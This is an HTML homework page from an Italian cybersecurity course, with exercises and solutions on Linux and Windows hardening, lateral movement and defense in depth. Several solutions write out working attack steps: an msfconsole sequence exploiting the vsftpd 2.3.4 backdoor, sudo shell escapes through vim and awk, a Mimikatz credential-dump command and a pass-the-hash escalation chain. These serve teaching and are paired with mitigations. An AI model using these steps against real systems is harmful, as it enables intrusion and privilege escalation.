@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="it"><head><meta charset="UTF-8"><title>Compiti G6 Blocco 1 - Consolida Modulo 1</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,'Segoe UI',sans-serif;background:#F8FAFC;color:#0F1B2D;line-height:1.6;padding:20px}
+.container{max-width:900px;margin:0 auto}
+header{background:linear-gradient(135deg,#0F1B2D 0%,#1E293B 100%);color:#fff;padding:30px;border-radius:12px;margin-bottom:24px}
+header h1{font-size:24px;margin-bottom:6px}header p{color:#CBD5E1;font-size:14px}
+.intro{background:#fff;border:1px solid #CBD5E1;border-radius:10px;padding:18px;margin-bottom:20px;font-size:14px}
+.cat{background:#0891B2;color:#fff;padding:10px 16px;border-radius:8px;margin:24px 0 14px;font-size:14px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px}
+.ex{background:#fff;border:1px solid #CBD5E1;border-radius:10px;padding:18px;margin-bottom:12px}
+.ex-num{display:inline-block;background:#0891B2;color:#fff;padding:3px 10px;border-radius:6px;font-size:12px;font-weight:700;margin-bottom:8px}
+.ex h3{font-size:15px;margin-bottom:8px}.ex p{font-size:13px;margin-bottom:8px;color:#334155}
+.ex ul{margin:6px 0 8px 20px;font-size:12px;color:#475569}
+details{margin-top:10px;background:#F1F5F9;border-radius:6px;padding:10px 14px}
+summary{cursor:pointer;font-weight:600;color:#0891B2;font-size:12px}
+.sol{font-size:12px;color:#0F1B2D;line-height:1.7;margin-top:8px}
+.sol code{background:#1E293B;color:#38BDF8;padding:2px 6px;border-radius:4px;font-family:Consolas,monospace;font-size:11px}
+</style></head><body><div class="container">
+<header><h1>📝 Compiti G6 · Blocco 1</h1><p>Consolida Modulo 1 · hardening, attacchi laterali, pattern trasversali · 18 esercizi</p></header>
+<div class="intro"><strong>Obiettivo:</strong> consolidare i temi della giornata (hardening + Kali + chiusura Modulo 1). Esercizi di riflessione e analisi. Da svolgere entro il 29 aprile.</div>
+
+<div class="cat">A · Hardening Linux</div>
+
+<div class="ex"><span class="ex-num">1</span><h3>Audit di un server fresco</h3><p>Hai ssh-root su un Ubuntu 22.04 appena installato. Scrivi 5 comandi (one-liner) che useresti per un primo assessment rapido di sicurezza.</p>
+<details><summary>Soluzione tipica</summary><div class="sol">
+<code>awk -F: '$3==0 {print $1}' /etc/passwd</code> — utenti UID 0<br>
+<code>systemctl list-unit-files --state=enabled | wc -l</code> — quanti servizi attivi<br>
+<code>ss -tlnp</code> — porte in listen e processi associati<br>
+<code>find / -perm -4000 -type f 2>/dev/null</code> — binari SUID<br>
+<code>grep -E '^(PermitRootLogin|PasswordAuth)' /etc/ssh/sshd_config</code> — stato SSH<br>
+Extra: <code>sudo lynis audit system</code> per un audit completo automatico.</div></details></div>
+
+<div class="ex"><span class="ex-num">2</span><h3>sudoers: trova il problema</h3><p>Analizza questa riga sudoers e identifica il problema:<br><code>developer ALL=(ALL) NOPASSWD: /usr/bin/vim /etc/app.conf</code></p>
+<details><summary>Soluzione</summary><div class="sol">Problemi multipli:<br>
+1. <strong>vim è un "shell escape binary"</strong> (GTFOBins): una volta dentro vim con sudo, <code>:!/bin/bash</code> apre shell root.<br>
+2. <strong>NOPASSWD</strong> significa che chiunque abbia compromesso l'account developer diventa root senza password.<br>
+3. La path-restriction <code>/etc/app.conf</code> è <strong>illusoria</strong>: vim accede comunque a qualsiasi file via <code>:e /etc/shadow</code>.<br>
+<strong>Fix:</strong> usare editor non-escape come <code>sudoedit</code> (che preserva ACL e non dà shell), o meglio rimuovere sudo e delegare modifica config via API applicativa.</div></details></div>
+
+<div class="ex"><span class="ex-num">3</span><h3>Mount options di /tmp</h3><p>Perché è importante montare /tmp con <code>noexec, nosuid, nodev</code>? Per ciascuna opzione indica quale classe di attacco mitiga.</p>
+<details><summary>Soluzione</summary><div class="sol"><strong>noexec</strong>: il kernel rifiuta di eseguire binari da /tmp. Mitiga molti exploit che scaricano payload in /tmp e li lanciano (pattern comune di malware e reverse shell post-exploit).<br>
+<strong>nosuid</strong>: il bit SUID viene ignorato sui file in /tmp. Mitiga il caso in cui l'attaccante carica un binario SUID-root per escalation.<br>
+<strong>nodev</strong>: file device (/dev/hda ecc.) non funzionano se creati in /tmp. Mitiga attacchi esotici di creazione device file per bypass permessi.<br>
+<strong>Attenzione:</strong> alcune applicazioni (installer legacy, compilatori, apt in certe versioni) falliscono con noexec su /tmp. Testare in staging prima di produrre.</div></details></div>
+
+<div class="ex"><span class="ex-num">4</span><h3>SSH hardening: 3 livelli</h3><p>Configura /etc/ssh/sshd_config per un server esposto su Internet. Scrivi le 8 direttive minime di hardening con valori.</p>
+<details><summary>Soluzione</summary><div class="sol"><code>Port 22</code> (o custom, scelta di basso valore security)<br>
+<code>PermitRootLogin no</code><br>
+<code>PasswordAuthentication no</code><br>
+<code>PubkeyAuthentication yes</code><br>
+<code>PermitEmptyPasswords no</code><br>
+<code>MaxAuthTries 3</code><br>
+<code>ClientAliveInterval 300</code><br>
+<code>ClientAliveCountMax 2</code><br>
+Extra: <code>AllowUsers admin@10.0.0.0/24</code>, <code>X11Forwarding no</code>, disabilitare cipher deboli via <code>KexAlgorithms</code>, <code>Ciphers</code>, <code>MACs</code> espliciti.</div></details></div>
+
+<div class="cat">B · Hardening Windows</div>
+
+<div class="ex"><span class="ex-num">5</span><h3>GPO e ordine di applicazione</h3><p>Un PC Windows joined a dominio ha: (a) policy locale che dice "password min 8 caratteri", (b) GPO a livello Domain che dice "password min 12", (c) GPO su OU "Developers" che dice "password min 10". Il PC è membro dell'OU Developers. Qual è la policy effettiva e perché?</p>
+<details><summary>Soluzione</summary><div class="sol">L'ordine LSDOU (Local → Site → Domain → OU) applica dal più esterno al più interno. In conflitto, <strong>vince l'ultima applicata</strong>, cioè la più vicina all'utente/PC = <strong>OU</strong>.<br>
+Policy effettiva: <strong>password min 10 caratteri</strong> (quella dell'OU Developers).<br>
+Se la GPO Domain avesse il flag <strong>Enforced</strong>, vincerebbe lei (12 caratteri) — Enforced inverte la logica LSDOU.<br>Verificare con <code>gpresult /h report.html</code> sul PC.</div></details></div>
+
+<div class="ex"><span class="ex-num">6</span><h3>LAPS: risolve cosa esattamente</h3><p>Spiega in 4-5 frasi perché LAPS è considerato un game-changer per la sicurezza AD, e cosa succede senza LAPS in uno scenario di incidente.</p>
+<details><summary>Soluzione</summary><div class="sol">Senza LAPS, la password dell'account admin locale è tipicamente identica su tutti i PC aziendali (nasce da imaging standard). Compromesso un singolo PC (phishing, USB drop, drive-by), l'attaccante dump con Mimikatz l'hash dell'admin locale. Quell'hash funziona via Pass-the-Hash su tutti gli altri PC = <strong>movimento laterale libero</strong>. LAPS genera password random unica per ogni PC, custodita cifrata in attributo AD leggibile solo da gruppi autorizzati, e la ruota periodicamente (tipico 30 giorni). Risultato: hash diverso per macchina, PtH si ferma al primo PC. È l'unica mitigazione strutturale al pattern, più efficace di qualunque EDR.</div></details></div>
+
+<div class="ex"><span class="ex-num">7</span><h3>PowerShell: difese contro LotL</h3><p>Un attaccante esegue: <code>powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...</code> (payload offuscato in base64). Elenca 4 difese che lascerebbero traccia o bloccherebbero.</p>
+<details><summary>Soluzione</summary><div class="sol">
+1. <strong>Script Block Logging</strong> (Event ID 4104): registra lo script DECODIFICATO dopo l'esecuzione. L'offuscamento base64 non nasconde nulla al log.<br>
+2. <strong>AMSI</strong> (Antimalware Scan Interface): Defender scansiona il codice al momento dell'invocazione, pattern malevoli noti bloccati.<br>
+3. <strong>Constrained Language Mode</strong>: se attivo, molte operazioni (.NET reflection, COM, Add-Type) sono disabilitate → payload moderni non girano.<br>
+4. <strong>WDAC/AppLocker</strong>: policy che permettono PowerShell solo in Constrained mode per utenti non-admin, o bloccano powershell.exe per utenti standard.<br>
+5. <strong>Disabilitare PS v2</strong>: senza i controlli precedenti. Gli attaccanti la invocano esplicitamente come bypass (downgrade attack).</div></details></div>
+
+<div class="ex"><span class="ex-num">8</span><h3>BitLocker: limiti</h3><p>BitLocker con TPM+PIN protegge da quali minacce? Non protegge da quali altre?</p>
+<details><summary>Soluzione</summary><div class="sol"><strong>Protegge da:</strong> furto fisico del dispositivo spento (attaccante rimuove disco, prova a montare su altro PC → cifrato, illeggibile); accesso amministrativo offline (live CD che monta il disco); smaltimento non sicuro di hardware dismesso.<br>
+<strong>Non protegge da:</strong> malware in esecuzione sul PC acceso (dati in RAM/disco in chiaro); attaccante remoto via exploit di rete; attaccante con credenziali valide; attaccante con accesso fisico a PC acceso e loggato; cold boot attack sofisticato (rari ma possibili).<br>
+BitLocker è un controllo <strong>complementare</strong> all'hardening software, non sostitutivo.</div></details></div>
+
+<div class="cat">C · Attacchi laterali e Kali</div>
+
+<div class="ex"><span class="ex-num">9</span><h3>Nmap output: cosa ti dice</h3><p>Hai lanciato <code>nmap -sV 192.168.10.50</code> e ottenuto: porta 21/tcp open vsftpd 2.3.4, porta 22/tcp open OpenSSH 7.6p1, porta 80/tcp open Apache 2.4.29. Indica il rischio di ciascun servizio e il primo vettore che un attaccante proverebbe.</p>
+<details><summary>Soluzione</summary><div class="sol"><strong>vsftpd 2.3.4:</strong> CVE-2011-2523 backdoor "smiley face" — exploit diretto via Metasploit <code>exploit/unix/ftp/vsftpd_234_backdoor</code>, shell root in pochi secondi. <strong>Rischio critico.</strong><br>
+<strong>OpenSSH 7.6p1</strong> (Ubuntu 18.04): CVE-2018-15473 (username enumeration) — utile per enumerare utenti validi prima di brute-force. Brute-force SSH con Hydra se PasswordAuth attivo. <strong>Rischio medio.</strong><br>
+<strong>Apache 2.4.29:</strong> CVE-2017-15715 (file upload), CVE-2019-0211 (privilege escalation locale). Dipende dalla configurazione — se sono attivi mod_cgi o mod_php con upload non validato, exploit possibile. <strong>Rischio medio-alto.</strong><br>
+<strong>Primo vettore:</strong> vsftpd, è instant-win se esposto.</div></details></div>
+
+<div class="ex"><span class="ex-num">10</span><h3>Metasploit: flusso base</h3><p>Scrivi la sequenza esatta di comandi msfconsole per exploitare il backdoor di vsftpd 2.3.4 sull'host 192.168.56.50.</p>
+<details><summary>Soluzione</summary><div class="sol">
+<code>msfconsole</code><br>
+<code>msf6 > search vsftpd</code><br>
+<code>msf6 > use exploit/unix/ftp/vsftpd_234_backdoor</code><br>
+<code>msf6 > show options</code><br>
+<code>msf6 > set RHOSTS 192.168.56.50</code><br>
+<code>msf6 > exploit</code>  (oppure <code>run</code>)<br><br>
+Il payload default di questo modulo è <code>cmd/unix/interact</code>, che dà shell root sul target dopo il trigger del backdoor (porta 6200). Se tutto va, prompt diventa <code>$</code> senza username — <code>id</code> conferma <code>uid=0(root)</code>.</div></details></div>
+
+<div class="ex"><span class="ex-num">11</span><h3>Pass-the-Hash: la catena</h3><p>Un attaccante compromette PC1 (workstation normale) come utente locale. Come arriva a domain admin via Pass-the-Hash, passo per passo?</p>
+<details><summary>Soluzione</summary><div class="sol">
+1. Su PC1 ottiene shell come utente normale.<br>
+2. <strong>Privilege escalation locale</strong> (SUID, sudo misconfig, Windows token → SYSTEM o admin locale).<br>
+3. Come admin locale, lancia Mimikatz: <code>sekurlsa::logonpasswords</code> → dump hash NTLM di tutti gli utenti recentemente loggati su PC1.<br>
+4. Se un help desk technician si era loggato su PC1 per assistenza, il suo hash è lì.<br>
+5. Con quell'hash, <strong>Pass-the-Hash</strong> verso altri PC (che spesso accettano help desk group come admin locale).<br>
+6. Si ripete su PC2, PC3... finché trova hash di un utente con diritti Domain Admin (tipicamente durante logon di un sysadmin per manutenzione).<br>
+7. <strong>Game over:</strong> PtH con hash DA → accesso a Domain Controller → controllo totale dominio.<br>
+<strong>Mitigazione principale:</strong> Tier Model Microsoft — admin di Tier 0 (DC) non devono MAI loggarsi su Tier 2 (workstation). Protected Users group, LAPS, Credential Guard tutti complementari.</div></details></div>
+
+<div class="ex"><span class="ex-num">12</span><h3>GTFOBins: privilege esc.</h3><p>Un utente demo ha <code>sudo -l</code> che mostra: <code>(root) NOPASSWD: /usr/bin/awk</code>. Come diventa root?</p>
+<details><summary>Soluzione</summary><div class="sol">awk supporta l'opzione <code>-v</code> e pattern di esecuzione che permettono shell escape. Da GTFOBins:<br>
+<code>sudo awk 'BEGIN {system("/bin/bash")}'</code><br>
+Risultato: shell root immediata. awk è un interprete con capacità system(), abusabile quando accoppiato a sudo senza restrizioni.<br>
+<strong>Lezione difensiva:</strong> nessun binario con capacità shell-escape (awk, vim, less, find, more, man, ed, tar, nano...) dovrebbe essere in sudoers senza wrapping restrittivo. Alternative: <code>sudoedit</code> per edit file, script wrapper con input sanitizzato, delegate specifica via setcap.</div></details></div>
+
+<div class="cat">D · Pattern trasversali e sintesi Modulo 1</div>
+
+<div class="ex"><span class="ex-num">13</span><h3>Defense in depth: mappa i 6 layer</h3><p>Per un'applicazione web aziendale (frontend + API + DB) esposta su Internet, disegna (in testo) i 6 layer di defense in depth con un controllo concreto per ciascuno.</p>
+<details><summary>Soluzione tipica</summary><div class="sol">
+<strong>Perimetro:</strong> WAF cloud (Cloudflare/AWS WAF) + DDoS protection + firewall edge.<br>
+<strong>Segmentazione:</strong> VPC con subnet separate (DMZ pubblica, app layer, data layer), SG/NSG con policy least privilege.<br>
+<strong>Host:</strong> immagini container hardened (distroless), VM con CIS baseline applicato via Ansible.<br>
+<strong>Applicazione:</strong> secure coding (input validation), SAST/DAST in CI, dependency scanning (SCA), rate limiting API.<br>
+<strong>Dato:</strong> encryption at rest (TDE su DB, KMS per secrets), encryption in transit (TLS 1.3 ovunque incluso DB), row-level security.<br>
+<strong>Identità:</strong> IAM cloud + Zero Trust (MFA per ops), service principals per app-to-DB (niente password hard-coded), access review trimestrale.</div></details></div>
+
+<div class="ex"><span class="ex-num">14</span><h3>Identità &gt; IP: perché</h3><p>Il tuo collega senior dice "l'era delle policy basate su IP è finita". Spiega in 4-5 frasi perché, con esempi concreti.</p>
+<details><summary>Soluzione</summary><div class="sol">Le policy IP-based assumono che l'IP sia un proxy stabile dell'identità — assunzione rotta nei contesti moderni. (1) <strong>Container/Kubernetes:</strong> i pod hanno IP effimeri che cambiano a ogni deploy; una policy "deny IP 10.1.2.3 → DB" dura 5 minuti. (2) <strong>Smart working:</strong> lo stesso utente accede da home ISP diverso ogni giorno, IP change continuo. (3) <strong>Cloud autoscaling:</strong> i worker EC2 nascono e muoiono, IP pool condiviso. (4) <strong>BYOD:</strong> dispositivo personale cambia rete più volte al giorno.<br>Le policy identity-based (service principal, utente autenticato + device compliance) sono robuste perché l'identità è stabile anche quando l'IP cambia.</div></details></div>
+
+<div class="ex"><span class="ex-num">15</span><h3>Log è tutto: un esempio storico</h3><p>Perché il caso SolarWinds 2020 è anche una lezione su "log è tutto"? Cosa sarebbe servito per rilevarlo prima?</p>
+<details><summary>Soluzione</summary><div class="sol">Il malware SUNBURST usava comunicazioni C2 mascherate da telemetria legittima Orion (domini tipo avsvmcloud.com). Chi aveva log DNS + SIEM con rilevazione di domini a bassa reputazione/NXDOMAIN patterns anomali aveva SEGNALI — ma nessuno li correlava. Il caso mostra che: (1) i log devono essere RACCOLTI (DNS, netflow, endpoint); (2) CORRELATI (singoli query anomale non bastano, servono pattern); (3) ANALIZZATI con aspettative di baseline (ogni software parla con i "suoi" domini noti, tutto il resto è anomalia). Molti clienti avevano i log ma non il secondo e terzo step. Il SOC moderno (Modulo 5) è costruito esattamente per questo: raccolta + correlazione + threat hunting.</div></details></div>
+
+<div class="ex"><span class="ex-num">16</span><h3>Automazione: baseline applicata a scala</h3><p>Dovresti applicare CIS Benchmark L1 a 500 server Linux. Disegna pipeline automatizzata a step.</p>
+<details><summary>Soluzione</summary><div class="sol">
+<strong>1. Inventory:</strong> Ansible dynamic inventory da CMDB o cloud API (tag "env=prod", "os=ubuntu").<br>
+<strong>2. Apply:</strong> Ansible playbook (ruolo <code>ansible-lockdown.ubuntu_22_cis</code>), eseguito su target groups con strategia <code>serial: 20%</code> (batch per evitare outage massivi).<br>
+<strong>3. Verify:</strong> InSpec profile CIS Ubuntu 22, eseguito post-apply, genera report JSON.<br>
+<strong>4. Report:</strong> ingestion dei report in dashboard (Heimdall, Splunk, Grafana) con tracking hardening index nel tempo.<br>
+<strong>5. CI integration:</strong> pipeline GitLab che blocca deploy nuova VM se baseline non passa.<br>
+<strong>6. Drift detection:</strong> cronjob settimanale Inspec + alert su SIEM se hardening index scende sotto 80.<br>
+<strong>7. Exception management:</strong> risk register Git-versionato per eccezioni con scadenza.</div></details></div>
+
+<div class="ex"><span class="ex-num">17</span><h3>Mini-report DELIVERABLE</h3><p>Riguarda il lab di oggi in aula (scan → exploit vsftpd → shell → SUID escalation). Per ognuna delle 4 fasi, identifica UNO specifico controllo L6 (hardening) che l'avrebbe bloccata. Scrivi risposta in 1 pagina A4 stile mini-report, salvala come PDF e preparala per la verifica del 29 aprile.</p>
+<details><summary>Suggerimento struttura</summary><div class="sol"><strong>Titolo:</strong> "Lab G6 post-mortem: controlli difensivi mancanti"<br>
+<strong>Fase 1 (nmap scan):</strong> controllo + motivazione.<br>
+<strong>Fase 2 (exploit vsftpd):</strong> controllo + motivazione.<br>
+<strong>Fase 3 (reverse shell):</strong> controllo + motivazione.<br>
+<strong>Fase 4 (SUID → root):</strong> controllo + motivazione.<br>
+<strong>Conclusione:</strong> quale singolo controllo, se presente, avrebbe prevenuto l'attacco end-to-end? Perché quell'attacco era così "facile" (CVE di 15 anni fa)?<br>
+<strong>Riferimenti:</strong> almeno 2 controlli CIS o MITRE ATT&CK citati per codice.<br>
+Questo esercizio è <strong>deliverable obbligatorio</strong> per il 29 aprile.</div></details></div>
+
+<div class="ex"><span class="ex-num">18</span><h3>Self-assessment M1</h3><p>Rispondi onestamente a queste 5 domande. Se su 3+ rispondi "no", pianifica un ripasso mirato del Modulo 1 prima del 29 aprile.</p>
+<ul><li>So spiegare a un collega non tecnico perché la microsegmentazione è utile, con un esempio concreto?</li>
+<li>Saprei leggere un controllo CIS e tradurlo in un comando o una modifica GPO?</li>
+<li>Saprei scrivere regole firewall pfSense in ordine corretto (first match wins + default deny)?</li>
+<li>Conosco almeno 3 tecniche di privilege escalation Linux e 3 Windows?</li>
+<li>Saprei, davanti a un incidente, fare una prima correlazione tra log di rete (IDS) e log di host (auditd/Event Log)?</li></ul>
+<details><summary>Come interpretare</summary><div class="sol">Questo non è un esercizio con soluzione "oggettiva" — è un momento di auto-valutazione. I 5 punti coprono i 5 concetti chiave del Modulo 1. Chi risponde "sì" a tutti è pronto per M2. Chi risponde "no" a 1-2 colmi facilmente con guida + compiti B1. Chi risponde "no" a 3+ dovrebbe tornare sulle guide G1-G5 specifiche prima di partire con M2 (altrimenti i concetti nuovi si impilano su lacune). È una domanda di maturità professionale: saper riconoscere i propri gap è metà del mestiere.</div></details></div>
+
+</div></body></html>
